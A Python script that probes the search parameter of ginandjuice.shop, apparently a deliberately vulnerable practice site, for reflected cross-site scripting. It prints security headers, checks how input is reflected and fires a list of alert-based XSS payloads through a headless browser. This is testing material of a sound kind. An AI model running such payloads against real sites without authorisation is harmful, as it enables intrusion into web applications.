#!/usr/bin/env python3
"""
Investigar por qué los payloads no funcionan en ginandjuice.shop
"""
import asyncio
from playwright.async_api import async_playwright
import aiohttp

async def check_site_protections():
    """Check CSP, headers, and sanitization"""
    url = "https://ginandjuice.shop/catalog?searchTerm=test"
    
    print("=" * 60)
    print("INVESTIGATING GINANDJUICE.SHOP PROTECTIONS")
    print("=" * 60)
    
    # Check HTTP headers
    print("\n[1] Checking HTTP Headers...")
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            headers = resp.headers
            print(f"Status: {resp.status}")
            
            # Check for security headers
            csp = headers.get('Content-Security-Policy', 'None')
            xss_protection = headers.get('X-XSS-Protection', 'None')
            x_frame = headers.get('X-Frame-Options', 'None')
            
            print(f"Content-Security-Policy: {csp}")
            print(f"X-XSS-Protection: {xss_protection}")
            print(f"X-Frame-Options: {x_frame}")
    
    # Check input reflection
    print("\n[2] Checking Input Reflection...")
    test_strings = [
        "PROBE123",
        "<script>alert(1)</script>",
        "<img src=x>",
        "'\"><svg/onload=alert(1)>"
    ]
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        for test in test_strings:
            test_url = f"https://ginandjuice.shop/catalog?searchTerm={test}"
            await page.goto(test_url, wait_until='networkidle', timeout=10000)
            content = await page.content()
            
            if test in content:
                print(f"✓ '{test[:30]}' REFLECTED (raw)")
            elif any(escaped in content for escaped in [test.replace('<', '&lt;'), test.replace('>', '&gt;')]):
                print(f"⚠ '{test[:30]}' reflected but HTML-encoded")
            else:
                print(f"✗ '{test[:30]}' NOT reflected")
        
        # Check for actual XSS
        print("\n[3] Testing Real XSS Payloads...")
        
        xss_payloads = [
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "'><script>alert(1)</script>",
        ]
        
        for payload in xss_payloads:
            test_url = f"https://ginandjuice.shop/catalog?searchTerm={payload}"
            
            dialog_triggered = False
            
            def handle_dialog(dialog):
                nonlocal dialog_triggered
                dialog_triggered = True
                asyncio.create_task(dialog.dismiss())
            
            page.on('dialog', handle_dialog)
            
            try:
                await page.goto(test_url, wait_until='load', timeout=5000)
                await asyncio.sleep(1)
                
                if dialog_triggered:
                    print(f"✅ ALERT TRIGGERED: {payload[:40]}")
                else:
                    # Check if script executed in DOM
                    has_script = await page.evaluate("""
                        () => {
                            const scripts = document.querySelectorAll('script');
                            for (let s of scripts) {
                                if (s.textContent.includes('alert')) return true;
                            }
                            return false;
                        }
                    """)
                    
                    if has_script:
                        print(f"⚠ Script in DOM but no alert: {payload[:40]}")
                    else:
                        print(f"❌ No XSS: {payload[:40]}")
            except Exception as e:
                print(f"❌ Error testing '{payload[:30]}': {str(e)[:50]}")
        
        await browser.close()
    
    print("\n" + "=" * 60)
    print("ANALYSIS COMPLETE")
    print("=" * 60)

if __name__ == "__main__":
    asyncio.run(check_site_protections())
